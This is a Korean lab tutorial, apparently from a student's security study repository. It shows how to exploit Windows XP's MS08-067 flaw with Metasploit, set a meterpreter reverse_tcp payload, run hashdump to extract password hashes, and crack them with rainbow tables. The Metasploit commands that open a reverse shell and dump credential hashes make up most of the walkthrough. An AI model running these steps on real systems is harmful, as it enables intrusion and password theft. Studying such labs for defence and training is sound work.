# Window Xp에서 Pass the hash 공격

## 네트워크 동작확인 1
처음으로 우리가 할일은 Kali와 Window Xp가 연결되어있는지 확인하는 것이다.
이는 아래의 사진과 같이 연결 확인이 가능하다.
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%20Xp/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC%20%EC%97%B0%EA%B2%B0%20%ED%99%95%EC%9D%B8.png)

## 네트워크 동작확인 2
원격접속에 필요한 포트들이 열렸는지 확인하기 위해 다음과 같은 방법을 통해 확인한다.

**nmap (WindowXp)**

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%20Xp/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC%20%EC%97%B0%EA%B2%B0%20%ED%99%95%EC%9D%B82.png)

우리는 위 사진을 통해 원격접속에 필요한 포트들이 모두 열려있음을 알 수 있다.

## NMAP?
NMAP은 port Scanning 툴로써 Host나 Network를 Scanning할 때 아주 유용한 시스템 보안툴인과 동시에, 해커에게 강력한 해킹툴로서 사용할 수 있는 도구이다.
NMAP은 기존의 Port ScanningTool에 비해 다양한 옵션과 방화벽 안쪽의 네트워크도 스캔할 수 있는 강력한 기능이 있다.
</br>

## Window XP에서 Password 수집하기

**msfconsole 을 Kali의 명령창에 입력한다.**

이후 우리는 Window XP의 취약점인 MS08-067을 이전의 실습을 통해 알고 있다.
이를 통해 우리는 password를 얻어낼 것이다.

**search ms08-067**

**use exploit/windows/smb/ms08_067_netapi**

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%20Xp/Window%20Xp%EC%97%90%EC%84%9C%20Password%EC%A0%95%EB%B3%B4%20%EC%88%98%EC%A7%91%201.png)

**set payload windows/meterpreter/reverse_tcp_allports**

**show options**

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%20Xp/Window%20Xp%EC%97%90%EC%84%9C%20Password%EC%A0%95%EB%B3%B4%20%EC%88%98%EC%A7%91%202.png)

**set RHOST (WindowXp의 IP)**

**set LHOST (Kali의 IP)**

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%20Xp/Window%20Xp%EC%97%90%EC%84%9C%20Password%EC%A0%95%EB%B3%B4%20%EC%88%98%EC%A7%91%203.png)

**run**

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%20Xp/Window%20Xp%EC%97%90%EC%84%9C%20Password%EC%A0%95%EB%B3%B4%20%EC%88%98%EC%A7%91%204.png)

**sysinfo**

**hashdump**

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%20Xp/Window%20Xp%EC%97%90%EC%84%9C%20Password%EC%A0%95%EB%B3%B4%20%EC%88%98%EC%A7%91%20%EC%99%84%EB%A3%8C.png)


### 이를 통한 공격방법은?
우리는 MS08-067을 통해  windowXp의 Password Hash를 구할 수  있게 되었다.
그렇다면 이것이 과연 무슨 역활을 하는가에 대해 생각하면 다음과 같이 이를 활용해서 공격을 할 수 있다.
그것은 바로 raindow Hashtable attack을 통해 취약점을 통해 구한 hash의 값에 맞는 원래의 Pw를 찾아내는 공격을 통해 사용자의 Password를 알아 낼 수 있다.
</br>
